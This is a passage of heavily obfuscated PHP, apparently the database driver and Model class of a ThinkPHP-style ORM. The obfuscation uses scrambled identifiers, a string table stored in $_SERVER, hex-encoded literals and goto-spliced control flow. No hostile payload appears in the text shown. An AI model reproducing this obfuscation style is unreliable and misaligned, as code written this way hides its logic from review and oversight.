$c≤‡§ÜÜ“¶ = $F∫Àû°‡¢∏[33]; if (!empty($FßìûßÃú∆)) { switch ($this->dbType) { case $F∫Àû°‡¢∏[844]: case $F∫Àû°‡¢∏[836]: $FßìûßÃú∆ = explode($F∫Àû°‡¢∏[47], $FßìûßÃú∆); if (count($FßìûßÃú∆) > 1) { $c≤‡§ÜÜ“¶ .= $F∫Àû°‡¢∏[48] . $FßìûßÃú∆[1] . $F∫Àû°‡¢∏[49] . $FßìûßÃú∆[0] . $F∫Àû°‡¢∏[50]; } else { $c≤‡§ÜÜ“¶ .= $F∫Àû°‡¢∏[48] . $FßìûßÃú∆[0] . $F∫Àû°‡¢∏[50]; } break; case $F∫Àû°‡¢∏[817]: case $F∫Àû°‡¢∏[835]: break; case $F∫Àû°‡¢∏[819]: break; case $F∫Àû°‡¢∏[818]: case $F∫Àû°‡¢∏[820]: break; case $F∫Àû°‡¢∏[847]: default: $c≤‡§ÜÜ“¶ .= $F∫Àû°‡¢∏[48] . $FßìûßÃú∆ . $F∫Àû°‡¢∏[50]; } } return $c≤‡§ÜÜ“¶; } public function parseKey(&$A´ã¶Â±Ü‰, $a¡â˘Ãøå¶ = true) { $C¶ÖÚß˘û‚ =& $_SERVER[Æ¡î¢≠¯™]; if ($a¡â˘Ãøå¶) { $A´ã¶Â±Ü‰ = $this->parseKeyCheck($A´ã¶Â±Ü‰); } if ($this->dbType == $C¶ÖÚß˘û‚[847]) { if ($A´ã¶Â±Ü‰ != $C¶ÖÚß˘û‚[183] && !preg_match($C¶ÖÚß˘û‚[810], $A´ã¶Â±Ü‰)) { $A´ã¶Â±Ü‰ = $C¶ÖÚß˘û‚[811] . trim($A´ã¶Â±Ü‰, $C¶ÖÚß˘û‚[811]) . $C¶ÖÚß˘û‚[811]; } return $A´ã¶Â±Ü‰; } else { return parent::parseKey($A´ã¶Â±Ü‰); } } public function close() { $this->_linkID = null; } public function error() { $c√∆É°É∑∑ =& $_SERVER[Æ¡î¢≠¯™]; if ($this->PDOStatement) { $a›Éáú´ëÖ = $this->PDOStatement->errorInfo(); $this->error = $a›Éáú´ëÖ[1] . $c√∆É°É∑∑[4] . $a›Éáú´ëÖ[2]; } else { $this->error = $c√∆É°É∑∑[33]; } if ($c√∆É°É∑∑[33] != $this->queryStr) { $this->error .= LNG($c√∆É°É∑∑[45]) . $this->queryStr; } think_trace($this->error, $c√∆É°É∑∑[33], $c√∆É°É∑∑[46]); return $this->error; } public function escapeString($C‹˜≥ﬂØü¯) { $fŒçº«ë¿„ =& $_SERVER[Æ¡î¢≠¯™]; switch ($this->dbType) { case $fŒçº«ë¿„[844]: case $fŒçº«ë¿„[817]: case $fŒçº«ë¿„[835]: case $fŒçº«ë¿„[847]: return addslashes($C‹˜≥ﬂØü¯); case $fŒçº«ë¿„[819]: case $fŒçº«ë¿„[836]: case $fŒçº«ë¿„[818]: case $fŒçº«ë¿„[820]: return str_ireplace($fŒçº«ë¿„[55], $fŒçº«ë¿„[56], $C‹˜≥ﬂØü¯); } } protected function parseValue($f∏‹–É–ñœ) { $D»ö±¶∂ŸÕ =& $_SERVER[Æ¡î¢≠¯™]; if (is_string($f∏‹–É–ñœ)) { $f∏‹–É–ñœ = strpos($f∏‹–É–ñœ, $D»ö±¶∂ŸÕ[4]) === 0 ? $this->escapeString($f∏‹–É–ñœ) : $D»ö±¶∂ŸÕ[857] . $this->escapeString($f∏‹–É–ñœ) . $D»ö±¶∂ŸÕ[857]; } elseif (isset($f∏‹–É–ñœ[0]) && is_string($f∏‹–É–ñœ[0]) && strtolower($f∏‹–É–ñœ[0]) == $D»ö±¶∂ŸÕ[291]) { $f∏‹–É–ñœ = $this->escapeString($f∏‹–É–ñœ[1]); } elseif (is_array($f∏‹–É–ñœ)) { $f∏‹–É–ñœ = array_map(array($this, $D»ö±¶∂ŸÕ[858]), $f∏‹–É–ñœ); } elseif (is_bool($f∏‹–É–ñœ)) { $f∏‹–É–ñœ = $f∏‹–É–ñœ ? $D»ö±¶∂ŸÕ[93] : $D»ö±¶∂ŸÕ[472]; } elseif (is_null($f∏‹–É–ñœ)) { $f∏‹–É–ñœ = $D»ö±¶∂ŸÕ[111]; } return $f∏‹–É–ñœ; } public function getLastInsertId() { $a¯úÛƒ°Ñå =& $_SERVER[Æ¡î¢≠¯™]; switch ($this->dbType) { case $a¯úÛƒ°Ñå[844]: case $a¯úÛƒ°Ñå[836]: case $a¯úÛƒ°Ñå[817]: case $a¯úÛƒ°Ñå[835]: case $a¯úÛƒ°Ñå[819]: case $a¯úÛƒ°Ñå[847]: return $this->_linkID->lastInsertId(); case $a¯úÛƒ°Ñå[818]: case $a¯úÛƒ°Ñå[820]: $b—Ë˘∫ôÇÜ = $this->table; $AÛÕ£ô‡Ï˜ = $this->query("\123\x45\x4c\x45\103\124\x20{$b—Ë˘∫ôÇÜ}\x2e\x63\165\162\162\166\x61\154\40\143\165\162\162\166\x61\154\40\x46\122\117\115\x20\x64\x75\x61\154"); return $AÛÕ£ô‡Ï˜ ? $AÛÕ£ô‡Ï˜[0][$a¯úÛƒ°Ñå[859]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($FÜ¡é⁄ìûô) { goto eßºÑÑˆ≥´; eßºÑÑˆ≥´: $dÂπ–ôπ∑± =& $_SERVER[Æ¡î¢≠¯™]; $Cá∆àå‡ì¯ = DATA_PATH . $dÂπ–ôπ∑±[860]; $Cèñç»Øä = fopen($Cá∆àå‡ì¯, $dÂπ–ôπ∑±[861]); goto D¢ÖﬁÈ¬µ©; D¢ÖﬁÈ¬µ©: if (!$Cèñç»Øä) { return !1; } if (flock($Cèñç»Øä, LOCK_EX)) { $CÖ¢è•’ØÖ = parent::query($FÜ¡é⁄ìûô); flock($Cèñç»Øä, LOCK_UN); fclose($Cèñç»Øä); return $CÖ¢è•’ØÖ; } flock($Cèñç»Øä, LOCK_UN); goto cÜ≤å°â›¢; cÜ≤å°â›¢: fclose($Cèñç»Øä); show_json($dÂπ–ôπ∑±[862], !1); return !1; goto eÃŸãºßåÖ; eÃŸãºßåÖ: } public function execute($fı∏¥Ñ´·à) { goto E•íˆåÜ◊; c¬É”´∂û†: if (!$fÉ≠ÎµîÏ‚) { return !1; } if (flock($fÉ≠ÎµîÏ‚, LOCK_EX)) { $e‘¯òÜ∏‹ò = parent::execute($fı∏¥Ñ´·à); flock($fÉ≠ÎµîÏ‚, LOCK_UN); fclose($fÉ≠ÎµîÏ‚); return $e‘¯òÜ∏‹ò; } flock($fÉ≠ÎµîÏ‚, LOCK_UN); goto f¨›¬æ…òÜ; f¨›¬æ…òÜ: fclose($fÉ≠ÎµîÏ‚); show_json($A∑ÿææ¡™ì[862], !1); return !1; goto Fê©óûë„®; E•íˆåÜ◊: $A∑ÿææ¡™ì =& $_SERVER[Æ¡î¢≠¯™]; $E∏ûï‚»ı£ = DATA_PATH . $A∑ÿææ¡™ì[860]; $fÉ≠ÎµîÏ‚ = fopen($E∏ûï‚»ı£, $A∑ÿææ¡™ì[861]); goto c¬É”´∂û†; Fê©óûë„®: } } goto F®æøœ≠ÀÒ; B’√√¨–†ø: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\157\162\x64\145\162", "\x61\x6c\x69\141\x73", "\150\141\x76\151\156\x67", "\x67\162\x6f\165\160", "\154\x6f\143\153", "\x64\151\x73\164\151\x6e\x63\x74", "\x61\165\164\157", "\x66\x69\154\x74\145\162", "\x76\141\x6c\151\x64\141\x74\145", "\162\x65\x73\x75\x6c\164", "\142\151\156\144", "\164\x6f\x6b\x65\156"); public function __construct($C∫πà±éË  = '', $e∆ä∫áûÇ˜ = '', $D®»◊Í◊ó = '') { $EçÉ†∂§Òâ =& $_SERVER[Æ¡î¢≠¯™]; $this->_initialize(); if (!empty($C∫πà±éË )) { if (strpos($C∫πà±éË , $EçÉ†∂§Òâ[103])) { list($this->dbName, $this->name) = explode($EçÉ†∂§Òâ[103], $C∫πà±éË ); } else { $this->name = $C∫πà±éË ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($e∆ä∫áûÇ˜)) { $this->tablePrefix = $EçÉ†∂§Òâ[33]; } elseif ($EçÉ†∂§Òâ[33] != $e∆ä∫áûÇ˜) { $this->tablePrefix = $e∆ä∫áûÇ˜; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($EçÉ†∂§Òâ[238]); } $this->db(0, empty($this->connection) ? $D®»◊Í◊ó : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $F√«Õ€ª¬Ω =& $_SERVER[Æ¡î¢≠¯™]; if (empty($this->fields)) { if (think_config($F√«Õ€ª¬Ω[239])) { $D‰éùó®Ωù = $this->dbName ? $this->dbName : think_config($F√«Õ€ª¬Ω[240]); $DÜ√Ò—ûÙ† = think_var_cache($F√«Õ€ª¬Ω[241] . strtolower(get_path_this($D‰éùó®Ωù) . $F√«Õ€ª¬Ω[103] . $this->name)); if ($DÜ√Ò—ûÙ†) { $C√Ñ¿ºÜ‡˜ = think_config($F√«Õ€ª¬Ω[242]); if (empty($C√Ñ¿ºÜ‡˜) || $DÜ√Ò—ûÙ†[$F√«Õ€ª¬Ω[243]] == $C√Ñ¿ºÜ‡˜) { $this->fields = $DÜ√Ò—ûÙ†; return; } } } $this->flush(); } } public function flush() { goto Bé»Û»∞äê; A‰À•Üä≤π: foreach ($fÊêë÷ëî’ as $C„À¿ıÒ⁄ú => $bŒî„ﬁ‡) { $B∫ »„ÕÓŒ[$C„À¿ıÒ⁄ú] = $bŒî„ﬁ‡[$d÷’”ﬂŒØî[29]]; if ($bŒî„ﬁ‡[$d÷’”ﬂŒØî[36]]) { $this->fields[$d÷’”ﬂŒØî[245]] = $C„À¿ıÒ⁄ú; if ($bŒî„ﬁ‡[$d÷’”ﬂŒØî[39]]) { $this->fields[$d÷’”ﬂŒØî[244]] = !0; } } } $this->fields[$d÷’”ﬂŒØî[246]] = $B∫ »„ÕÓŒ; if (think_config($d÷’”ﬂŒØî[242])) { $this->fields[$d÷’”ﬂŒØî[243]] = think_config($d÷’”ﬂŒØî[242]); } goto e ãÃ†˘∆Ñ; fª—íµ‚´: if (!$fÊêë÷ëî’) { return !1; } $this->fields = array_keys($fÊêë÷ëî’); $this->fields[$d÷’”ﬂŒØî[244]] = !1; goto A‰À•Üä≤π; Bé»Û»∞äê: $d÷’”ﬂŒØî =& $_SERVER[Æ¡î¢≠¯™]; $this->db->setModel($this->name); $fÊêë÷ëî’ = $this->db->getFields($this->getTableName()); goto fª—íµ‚´; e ãÃ†˘∆Ñ: if (think_config($d÷’”ﬂŒØî[239])) { $båÖµÇœÂ‹ = $this->dbName ? $this->dbName : think_config($d÷’”ﬂŒØî[240]); think_var_cache($d÷’”ﬂŒØî[241] . strtolower(get_path_this($båÖµÇœÂ‹) . $d÷’”ﬂŒØî[103] . $this->name), $this->fields); } goto a€äŸ‹Œ◊ê; a€äŸ‹Œ◊ê: } public function switchModel($aä§˜Ã◊±Ü, $B⁄“ï«ßø≠ = array()) { $A¨„Ëöˆ‚» =& $_SERVER[Æ¡î¢≠¯™]; $DØ—ΩüÍèﬂ = ucwords(strtolower($aä§˜Ã◊±Ü)) . $A¨„Ëöˆ‚»[247]; if (!class_exists($DØ—ΩüÍèﬂ)) { think_exception($DØ—ΩüÍèﬂ . think_lang($A¨„Ëöˆ‚»[248])); } $this->_extModel = new $DØ—ΩüÍèﬂ($this->name); if (!empty($B⁄“ï«ßø≠)) { foreach ($B⁄“ï«ßø≠ as $b≠‡”–∏‰Â) { $this->_extModel->setProperty($b≠‡”–∏‰Â, $this->{$b≠‡”–∏‰Â}); } } return $this->_extModel; } public function __set($cÛÉ§ΩﬂœÁ, $C´ê∏ï∫ùÖ) { $this->data[$cÛÉ§ΩﬂœÁ] = $C´ê∏ï∫ùÖ; } public function __get($C‹Ãê∏ÑÂ∏) { return isset($this->data[$C‹Ãê∏ÑÂ∏]) ? $this->data[$C‹Ãê∏ÑÂ∏] : null; } public function __isset($AÇ∫“Öñû≈) { return isset($this->data[$AÇ∫“Öñû≈]); } public function __unset($AÆøç»∆¢) { unset($this->data[$AÆøç»∆¢]); } public function __call($Aê≥ÑÖíÕï, $B±˘Î…õñ) { $BûüìûÆé∞ =& $_SERVER[Æ¡î¢≠¯™]; if (in_array(strtolower($Aê≥ÑÖíÕï), $this->methods, !0)) { $this->options[strtolower($Aê≥ÑÖíÕï)] = $B±˘Î…õñ[0]; return $this; } elseif (in_array(strtolower($Aê≥ÑÖíÕï), array($BûüìûÆé∞[249], $BûüìûÆé∞[250], $BûüìûÆé∞[251], $BûüìûÆé∞[252], $BûüìûÆé∞[253]), !0)) { $c´¬éŒ°±è = isset($B±˘Î…õñ[0]) ? $B±˘Î…õñ[0] : $BûüìûÆé∞[183]; $c´¬éŒ°±è = $this->db->parseKey($c´¬éŒ°±è); return $this->getField(strtoupper($Aê≥ÑÖíÕï) . $BûüìûÆé∞[254] . $c´¬éŒ°±è . $BûüìûÆé∞[255] . $Aê≥ÑÖíÕï, $BûüìûÆé∞[249]); } elseif (strtolower(substr($Aê≥ÑÖíÕï, 0, 5)) == $BûüìûÆé∞[256]) { $c´¬éŒ°±è = think_parse_name(substr($Aê≥ÑÖíÕï, 5)); $f¶πË“É’¶[$c´¬éŒ°±è] = $B±˘Î…õñ[0]; return $this->where($f¶πË“É’¶)->find(); } elseif (strtolower(substr($Aê≥ÑÖíÕï, 0, 10)) == $BûüìûÆé∞[257]) { $DÕÛ‰Ë—Œ” = think_parse_name(substr($Aê≥ÑÖíÕï, 10)); $f¶πË“É’¶[$DÕÛ‰Ë—Œ”] = $B±˘Î…õñ[0]; return $this->where($f¶πË“É’¶)->getField($B±˘Î…õñ[1]); } elseif (isset($this->_scope[$Aê≥ÑÖíÕï])) { return $this->scope($Aê≥ÑÖíÕï, $B±˘Î…õñ[0]); } elseif (method_exists($this, $Aê≥ÑÖíÕï)) { array_unshift($B±˘Î…õñ, $Aê≥ÑÖíÕï); return call_user_func_array(array($this, $BûüìûÆé∞[258]), $B±˘Î…õñ); } else { return call_user_func_array(array(parent, $Aê≥ÑÖíÕï), $B±˘Î…õñ); } } protected function call() { goto CéûöÌû∏ù; CéûöÌû∏ù: $f¨∫≈çÎáÚ =& $_SERVER[Æ¡î¢≠¯™]; $c±Ø◊è≤˘¶ = func_get_args(); $d≥ßœ¯—Ñ› = array_shift($c±Ø◊è≤˘¶); goto eîÔ≥‡á∂˜; eä¡ŸÁÜ∏: $aÇ§á§∞áø = call_user_func_array(array($this, $d≥ßœ¯—Ñ›), $c±Ø◊è≤˘¶); if (method_exists($this, $f¨∫≈çÎáÚ[262])) { $Dó…æ„ÿÇƒ = call_user_func_array(array($this, $f¨∫≈çÎáÚ[263]), array($F≠≠§£≠ßÓ, $c±Ø◊è≤˘¶, $aÇ§á§∞áø)); if ($Dó…æ„ÿÇƒ) { return $Dó…æ„ÿÇƒ; } } return $aÇ§á§∞áø; goto bäÔàäÑ—≥; eîÔ≥‡á∂˜: $F≠≠§£≠ßÓ = $d≥ßœ¯—Ñ›; if (is_array($d≥ßœ¯—Ñ›)) { $F≠≠§£≠ßÓ = $d≥ßœ¯—Ñ›[1]; $d≥ßœ¯—Ñ› = $d≥ßœ¯—Ñ›[0]; } $fô∞ıóúÂﬂ = count($c±Ø◊è≤˘¶) - 1; goto F≤ﬁ∏£ç≤∂; F≤ﬁ∏£ç≤∂: if (isset($c±Ø◊è≤˘¶[$fô∞ıóúÂﬂ]) && $c±Ø◊è≤˘¶[$fô∞ıóúÂﬂ] === $d≥ßœ¯—Ñ›) { think_exception(__CLASS__ . $f¨∫≈çÎáÚ[4] . $d≥ßœ¯—Ñ› . think_lang($f¨∫≈çÎáÚ[259])); return; } $c±Ø◊è≤˘¶[] = $d≥ßœ¯—Ñ›; if (method_exists($this, $f¨∫≈çÎáÚ[260])) { $Dó…æ„ÿÇƒ = call_user_func_array(array($this, $f¨∫≈çÎáÚ[261]), array($F≠≠§£≠ßÓ, $c±Ø◊è≤˘¶)); if (!is_null($Dó…æ„ÿÇƒ) && $Dó…æ„ÿÇƒ !== !1) { return $Dó…æ„ÿÇƒ; } } goto eä¡ŸÁÜ∏; bäÔàäÑ—≥: } protected function _initialize() { } protected function _facade($DÇ®›‡ˆ”¡) { $e∑Áú›‡©ê =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($this->fields)) { foreach ($DÇ®›‡ˆ”¡ as $aäòáÚ»´ => $F¶∆≥öÓéÇ) { if (!in_array($aäòáÚ»´, $this->fields, !0)) { unset($DÇ®›‡ˆ”¡[$aäòáÚ»´]); } elseif (is_scalar($F¶∆≥öÓéÇ)) { $this->_parseType($DÇ®›‡ˆ”¡, $aäòáÚ»´); } } } if (!empty($this->options[$e∑Áú›‡©ê[264]])) { $DÇ®›‡ˆ”¡ = array_map($this->options[$e∑Áú›‡©ê[264]], $DÇ®›‡ˆ”¡); unset($this->options[$e∑Áú›‡©ê[264]]); } $this->_beforeWrite($DÇ®›‡ˆ”¡); return $DÇ®›‡ˆ”¡; } protected function _beforeWrite(&$dî⁄…î∑Òº) { } public function add($Bç‡©¢Á”é = '', $FÆœõˆ≥ÆÀ = array(), $e€ŸüÕÕ‹ö = false) { goto dì¶Ùª™»Ö; c∏•‡ã Ìñ: if (!1 === $this->_beforeInsert($Bç‡©¢Á”é, $FÆœõˆ≥ÆÀ)) { return !1; } $DÍŒëâÌ–¢ = $this->db->insert($Bç‡©¢Á”é, $FÆœõˆ≥ÆÀ, $e€ŸüÕÕ‹ö); if (!1 !== $DÍŒëâÌ–¢) { $a·…‹›‹«∑ = $this->getLastInsID(); if ($a·…‹›‹«∑) { $Bç‡©¢Á”é[$this->getPk()] = $a·…‹›‹«∑; $this->_after_insert($Bç‡©¢Á”é, $FÆœõˆ≥ÆÀ); return $a·…‹›‹«∑; } $this->_after_insert($Bç‡©¢Á”é, $FÆœõˆ≥ÆÀ); } goto c•†ä€≠à“; dì¶Ùª™»Ö: if (empty($Bç‡©¢Á”é)) { if (!empty($this->data)) { $Bç‡©¢Á”é = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Æ¡î¢≠¯™][265]); return !1; } } $FÆœõˆ≥ÆÀ = $this->_parseOptions($FÆœõˆ≥ÆÀ); $Bç‡©¢Á”é = $this->_facade($Bç‡©¢Á”é); goto c∏•‡ã Ìñ; c•†ä€≠à“: return $DÍŒëâÌ–¢; goto cèØÒÇ£Û„; cèØÒÇ£Û„: } protected function _beforeInsert(&$AÎ¨⁄öàîÀ, $Eπ«°ã°⁄ê) { } protected function _after_insert($eÚƒŒïÜúÁ, $FØﬁ‹Œ˜Ëú) { } public function addAll($C·∆Ú∂çıˆ, $cÆúÒﬂüÒé = array(), $E¯Ωﬁ´‰¨ﬁ = false) { goto Aﬁ“∫Ãüå‘; c÷é•¬ÖΩ˘: foreach ($C·∆Ú∂çıˆ as $CÑ‘´åªçœ => $D‘≈Ã˜ŸÃ∫) { $C·∆Ú∂çıˆ[$CÑ‘´åªçœ] = $this->_facade($D‘≈Ã˜ŸÃ∫); } if (method_exists($this->db, $fÜÃòìïÇø[266])) { $cÜßÍ©⁄ãî = $this->db->insertAll($C·∆Ú∂çıˆ, $cÆúÒﬂüÒé, $E¯Ωﬁ´‰¨ﬁ); } else { $this->startTrans(); foreach ($C·∆Ú∂çıˆ as $CÑ‘´åªçœ => $D‘≈Ã˜ŸÃ∫) { $cÜßÍ©⁄ãî = $this->db->insert($D‘≈Ã˜ŸÃ∫, $cÆúÒﬂüÒé, $E¯Ωﬁ´‰¨ﬁ); } $this->commit(); } if (!1 !== $cÜßÍ©⁄ãî) { $Eî·ÀÑ™´ƒ = $this->getLastInsID(); if ($Eî·ÀÑ™´ƒ) { return $Eî·ÀÑ™´ƒ; } } goto F§•è’†Æ; Aﬁ“∫Ãüå‘: $fÜÃòìïÇø =& $_SERVER[Æ¡î¢≠¯™]; if (empty($C·∆Ú∂çıˆ)) { $this->error = think_lang($fÜÃòìïÇø[265]); return !1; } $cÆúÒﬂüÒé = $this->_parseOptions($cÆúÒﬂüÒé); goto c÷é•¬ÖΩ˘; F§•è’†Æ: return $cÜßÍ©⁄ãî; goto F≈åÌì…öë; F≈åÌì…öë: } public function selectAdd($cªπ¿©Ω– = '', $dÂ∫Õ—å‡ = '', $Büâãîœâ¿ = array()) { $E≠ıÈ∆Ì‘÷ =& $_SERVER[Æ¡î¢≠¯™]; $Büâãîœâ¿ = $this->_parseOptions($Büâãîœâ¿); if (!1 === ($D”ÑﬂÀ‹ü£ = $this->db->selectInsert($cªπ¿©Ω– ? $cªπ¿©Ω– : $Büâãîœâ¿[$E≠ıÈ∆Ì‘÷[267]], $dÂ∫Õ—å‡ ? $dÂ∫Õ—å‡ : $this->getTableName(), $Büâãîœâ¿))) { $this->error = think_lang($E≠ıÈ∆Ì‘÷[268]); return !1; } else { return $D”ÑﬂÀ‹ü£; } } public function save($bÂ⁄˜ªëË√ = '', $Bõüúﬁ≠ü´ = array()) { goto f¬∫§Çÿ”∑; A®÷ÏîŒ„ä: if (is_array($Bõüúﬁ≠ü´[$B∂¶ÃÊö÷œ[269]]) && isset($Bõüúﬁ≠ü´[$B∂¶ÃÊö÷œ[269]][$D‘åá ‡¢Ù])) { $aØêáú√ÙÇ = $Bõüúﬁ≠ü´[$B∂¶ÃÊö÷œ[269]][$D‘åá ‡¢Ù]; } if (!1 === $this->_beforeUpdate($bÂ⁄˜ªëË√, $Bõüúﬁ≠ü´)) { return !1; } $A€Æç´Éöü = $this->db->update($bÂ⁄˜ªëË√, $Bõüúﬁ≠ü´); goto a®•ä ∏ÓÜ; F’ΩêÉ¶è«: $Bõüúﬁ≠ü´ = $this->_parseOptions($Bõüúﬁ≠ü´); $D‘åá ‡¢Ù = $this->getPk(); if (!isset($Bõüúﬁ≠ü´[$B∂¶ÃÊö÷œ[269]])) { if (isset($bÂ⁄˜ªëË√[$D‘åá ‡¢Ù])) { $C™„≤èåÑ‘[$D‘åá ‡¢Ù] = $bÂ⁄˜ªëË√[$D‘åá ‡¢Ù]; $Bõüúﬁ≠ü´[$B∂¶ÃÊö÷œ[269]] = $C™„≤èåÑ‘; unset($bÂ⁄˜ªëË√[$D‘åá ‡¢Ù]); } else { $this->error = think_lang($B∂¶ÃÊö÷œ[268]); return !1; } } goto A®÷ÏîŒ„ä; f¬∫§Çÿ”∑: $B∂¶ÃÊö÷œ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($bÂ⁄˜ªëË√)) { if (!empty($this->data)) { $bÂ⁄˜ªëË√ = $this->data; $this->data = array(); } else { $this->error = think_lang($B∂¶ÃÊö÷œ[265]); return !1; } } $bÂ⁄˜ªëË√ = $this->_facade($bÂ⁄˜ªëË√); goto F’ΩêÉ¶è«; a®•ä ∏ÓÜ: if (!1 !== $A€Æç´Éöü) { if (isset($aØêáú√ÙÇ)) { $bÂ⁄˜ªëË√[$D‘åá ‡¢Ù] = $aØêáú√ÙÇ; } $this->_afterUpdate($bÂ⁄˜ªëË√, $Bõüúﬁ≠ü´); } return $A€Æç´Éöü; goto DÍàíﬂâù∞; DÍàíﬂâù∞: } protected function _beforeUpdate(&$b¶ÀÓŸŸéË, $Fˆ‹üíã§–) { } protected function _afterUpdate($Aè»∞ﬂ»Î¬, $bç®ŒûãáÊ) { } public function delete($E´∏é©à˜¢ = array()) { goto a·±ÚöÇ—ò; a˘˜ô¿å˜´: $C∫–∞Üä¥÷ = $this->db->delete($E´∏é©à˜¢); if (!1 !== $C∫–∞Üä¥÷) { $eÛœÖ¨ıåﬁ = array(); if (isset($aå¥—ë„œè)) { $eÛœÖ¨ıåﬁ[$b≥«Õƒ’ë§] = $aå¥—ë„œè; } $this->_after_delete($eÛœÖ¨ıåﬁ, $E´∏é©à˜¢); } return $C∫–∞Üä¥÷; goto FÑÚåØ´«“; a·±ÚöÇ—ò: $CõÛ÷…œÖê =& $_SERVER[Æ¡î¢≠¯™]; if (empty($E´∏é©à˜¢) && empty($this->options[$CõÛ÷…œÖê[269]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $b≥«Õƒ’ë§ = $this->getPk(); goto D¢ËπÁï÷Æ; D¢ËπÁï÷Æ: if (is_numeric($E´∏é©à˜¢) || is_string($E´∏é©à˜¢)) { if (strpos($E´∏é©à˜¢, $CõÛ÷…œÖê[47])) { $Aî¬Ñã≤ÇÉ[$b≥«Õƒ’ë§] = array($CõÛ÷…œÖê[270], $E´∏é©à˜¢); } else { $Aî¬Ñã≤ÇÉ[$b≥«Õƒ’ë§] = $E´∏é©à˜¢; } $this->options[$CõÛ÷…œÖê[269]] = $Aî¬Ñã≤ÇÉ; } $E´∏é©à˜¢ = $this->_parseOptions(); if (is_array($E´∏é©à˜¢[$CõÛ÷…œÖê[269]]) && isset($E´∏é©à˜¢[$CõÛ÷…œÖê[269]][$b≥«Õƒ’ë§])) { $aå¥—ë„œè = $E´∏é©à˜¢[$CõÛ÷…œÖê[269]][$b≥«Õƒ’ë§]; } goto a˘˜ô¿å˜´; FÑÚåØ´«“: } protected function _after_delete($e¥∞ï»ŒËá, $c—∂áö⁄¡ã) { } public function select($C¿≈åÈøÑ≤ = array()) { goto F≈êõ‘Ö†; FÙÀÓ¨ΩÉÕ: $f∫çÓ∫á† = $this->db->select($C¿≈åÈøÑ≤); if (!1 === $f∫çÓ∫á†) { return !1; } if (empty($f∫çÓ∫á†)) { return null; } goto bõèπ∫—ÆÈ; F≈êõ‘Ö†: $DÑ äÔËÁ◊ =& $_SERVER[Æ¡î¢≠¯™]; if (is_string($C¿≈åÈøÑ≤) || is_numeric($C¿≈åÈøÑ≤)) { $D¢ã‰ß≥‡” = $this->getPk(); if (strpos($C¿≈åÈøÑ≤, $DÑ äÔËÁ◊[47])) { $BæŸ–‹Ÿ†√[$D¢ã‰ß≥‡”] = array($DÑ äÔËÁ◊[270], $C¿≈åÈøÑ≤); } else { $BæŸ–‹Ÿ†√[$D¢ã‰ß≥‡”] = $C¿≈åÈøÑ≤; } $this->options[$DÑ äÔËÁ◊[269]] = $BæŸ–‹Ÿ†√; } elseif (!1 === $C¿≈åÈøÑ≤) { $C¿≈åÈøÑ≤ = $this->_parseOptions(); return $DÑ äÔËÁ◊[271] . $this->db->buildSelectSql($C¿≈åÈøÑ≤) . $DÑ äÔËÁ◊[272]; } $C¿≈åÈøÑ≤ = $this->_parseOptions(); goto FÙÀÓ¨ΩÉÕ; bõèπ∫—ÆÈ: $this->_afterSelect($f∫çÓ∫á†, $C¿≈åÈøÑ≤); return $f∫çÓ∫á†; goto CáåŸΩ⁄É’; CáåŸΩ⁄É’: } protected function _afterSelect(&$B»óáÈﬁ˘–, $B™Ò¥Î¯Ó∫) { } public function buildSql($eÎé∏≥∞ñ› = array()) { $d¨˜’µÛõ° =& $_SERVER[Æ¡î¢≠¯™]; $eÎé∏≥∞ñ› = $this->_parseOptions($eÎé∏≥∞ñ›); return $d¨˜’µÛõ°[271] . $this->db->buildSelectSql($eÎé∏≥∞ñ›) . $d¨˜’µÛõ°[272]; } public function optionsValue($FâÔµ¿ó˜è = null) { if (is_null($FâÔµ¿ó˜è)) { return $this->options; } elseif (is_array($FâÔµ¿ó˜è)) { $this->options = array_merge($this->options, $FâÔµ¿ó˜è); } } protected function _parseOptions($BŸÉ£ƒŸªâ = array()) { goto c¡ùé¢∑¡â; D»ÏÚé£÷ÿ: if (isset($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[269]]) && is_array($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[269]]) && !empty($C≠–„Ñøï§) && !isset($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[276]]) && !isset($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[273]])) { foreach ($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[269]] as $b‚ØìΩÜßô => $C‹ÕçÔ…‡Ç) { $b‚ØìΩÜßô = trim($b‚ØìΩÜßô); if (in_array($b‚ØìΩÜßô, $C≠–„Ñøï§, !0)) { if (is_scalar($C‹ÕçÔ…‡Ç)) { $this->_parseType($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[269]], $b‚ØìΩÜßô); } } elseif (!is_numeric($b‚ØìΩÜßô) && $DÑ°‹üÍÁ¢[80] != substr($b‚ØìΩÜßô, 0, 1) && !1 === strpos($b‚ØìΩÜßô, $DÑ°‹üÍÁ¢[103]) && !1 === strpos($b‚ØìΩÜßô, $DÑ°‹üÍÁ¢[254]) && !1 === strpos($b‚ØìΩÜßô, $DÑ°‹üÍÁ¢[277]) && !1 === strpos($b‚ØìΩÜßô, $DÑ°‹üÍÁ¢[278])) { unset($BŸÉ£ƒŸªâ[$DÑ°‹üÍÁ¢[269]][$b‚ØìΩÜßô]); } } } $this->_options_filter($BŸÉ£ƒŸªâ); return $BŸÉ£ƒŸªâ; goto aÍ»åâ©òË; c¡ùé¢∑¡â: $DÑ°‹üÍÁ¢ =& $_SERVER[Æ¡î¢≠¯™]; if (is_array($BŸÉ£ƒŸªâ)) { $BŸÉ£ƒŸªâ = array_merge($this->options, $BŸÉ£ƒŸªâ); } $this->options = array(); goto AπÂ¢®µ¿°; AπÂ¢®µ¿°: 